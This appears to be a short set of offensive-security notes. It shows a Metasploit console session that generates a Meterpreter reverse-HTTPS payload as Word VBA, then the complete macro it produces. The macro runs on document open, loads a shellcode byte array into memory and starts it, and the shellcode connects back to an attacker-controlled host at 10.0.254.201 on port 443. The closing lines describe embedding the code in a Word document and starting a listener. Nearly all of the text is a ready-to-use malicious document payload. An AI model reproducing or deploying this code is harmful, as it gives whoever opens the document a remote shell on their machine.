```bash
# in msfconsole
msf6 exploit(multi/fileformat/office_word_macro) > use windows/meterpreter/reverse_https
msf6 payload(windows/meterpreter/reverse_https) > set LHOST 10.0.254.201
LHOST => 10.0.254.201
msf6 payload(windows/meterpreter/reverse_https) > set LPORT 443
LPORT => 443
msf6 payload(windows/meterpreter/reverse_https) > set AutoRunScript post/windows/manage/smart_migrate
AutoRunScript => post/windows/manage/smart_migrate
msf6 payload(windows/meterpreter/reverse_https) > generate -f vba
# PAYLOAD
#If Vba7 Then
	Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Lxjyoc As Long, ByVal Lpewphyk As Long, ByVal Kvekgmeqd As LongPtr, Osvdrrwuc As Long, ByVal Cfjeevo As Long, Mkvvr As Long) As LongPtr
	Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Xzh As Long, ByVal Ukwii As Long, ByVal Fduthlxh As Long, ByVal Cxmh As Long) As LongPtr
	Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Wbohypn As LongPtr, ByRef Zpy As Any, ByVal Kbmeihxl As Long) As LongPtr
#Else
	Private Declare Function CreateThread Lib "kernel32" (ByVal Lxjyoc As Long, ByVal Lpewphyk As Long, ByVal Kvekgmeqd As Long, Osvdrrwuc As Long, ByVal Cfjeevo As Long, Mkvvr As Long) As Long
	Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Xzh As Long, ByVal Ukwii As Long, ByVal Fduthlxh As Long, ByVal Cxmh As Long) As Long
	Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Wbohypn As Long, ByRef Zpy As Any, ByVal Kbmeihxl As Long) As Long
#EndIf

Sub Auto_Open()
	Dim Gxnu As Long, Xuhzj As Variant, Drkflya As Long
#If Vba7 Then
	Dim  Iys As LongPtr, Sznfgv As LongPtr
#Else
	Dim  Iys As Long, Sznfgv As Long
#EndIf
	Xuhzj = Array(252,232,143,0,0,0,96,137,229,49,210,100,139,82,48,139,82,12,139,82,20,139,114,40,49,255,15,183,74,38,49,192,172,60,97,124,2,44,32,193,207,13,1,199,73,117,239,82,139,82,16,87,139,66,60,1,208,139,64,120,133,192,116,76,1,208,139,72,24,139,88,32,80,1,211,133,201,116,60,73,49, _
255,139,52,139,1,214,49,192,193,207,13,172,1,199,56,224,117,244,3,125,248,59,125,36,117,224,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18,233,128,255,255,255,93,104,110,101,116,0,104,119,105,110,105,84, _
104,76,119,38,7,255,213,49,219,83,83,83,83,83,232,115,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,77,97,99,105,110,116,111,115,104,59,32,73,110,116,101,108,32,77,97,99,32,79,83,32,88,32,49,52,95,48,41,32,65,112,112,108,101,87,101,98,75,105,116,47,53,51,55,46, _
51,54,32,40,75,72,84,77,76,44,32,108,105,107,101,32,71,101,99,107,111,41,32,67,104,114,111,109,101,47,49,49,55,46,48,46,48,46,48,32,83,97,102,97,114,105,47,53,51,55,46,51,54,0,104,58,86,121,167,255,213,83,83,106,3,83,83,104,187,1,0,0,232,36,1,0,0,47,53,121, _
78,78,76,116,84,113,83,51,85,116,69,105,119,84,83,106,45,112,57,103,100,53,76,113,48,104,51,78,68,116,117,74,75,69,53,99,69,121,117,48,98,89,88,101,73,119,108,56,70,57,97,48,51,50,68,76,97,50,66,103,83,73,101,117,95,78,53,56,116,84,48,112,107,51,65,48,67,101,88,81, _
110,70,95,109,49,104,114,80,45,122,45,117,118,111,77,86,55,53,89,81,119,113,83,118,114,45,57,48,54,71,115,69,77,50,72,68,104,57,68,107,77,118,80,112,72,84,101,107,99,88,78,110,109,78,120,102,82,114,48,66,76,50,101,105,89,0,80,104,87,137,159,198,255,213,137,198,83,104,0,50, _
232,132,83,83,83,87,83,86,104,235,85,46,59,255,213,150,106,10,95,104,128,51,0,0,137,224,106,4,80,106,31,86,104,117,70,158,134,255,213,83,83,83,83,86,104,45,6,24,123,255,213,133,192,117,20,104,136,19,0,0,104,68,240,53,224,255,213,79,117,205,232,73,0,0,0,106,64,104,0,16, _
0,0,104,0,0,64,0,83,104,88,164,83,229,255,213,147,83,83,137,231,87,104,0,32,0,0,83,86,104,18,150,137,226,255,213,133,192,116,207,139,7,1,195,133,192,117,229,88,195,95,232,107,255,255,255,49,48,46,48,46,50,53,52,46,50,48,49,0,187,240,181,162,86,106,0,83,255,213)

	Iys = VirtualAlloc(0, UBound(Xuhzj), &H1000, &H40)
	For Drkflya = LBound(Xuhzj) To UBound(Xuhzj)
		Gxnu = Xuhzj(Drkflya)
		Sznfgv = RtlMoveMemory(Iys + Drkflya, Gxnu, 1)
	Next Drkflya
	Sznfgv = CreateThread(0, 0, Iys, 0, 0, 0)
End Sub
Sub AutoOpen()
	Auto_Open
End Sub
Sub Workbook_Open()
	Auto_Open
End Sub

#END PAYLOAD
```
Add to macros and save as doc (Compatibility Mode)
open listener on kali
payload windows/meterpreter/reverse_https
LHOST 443
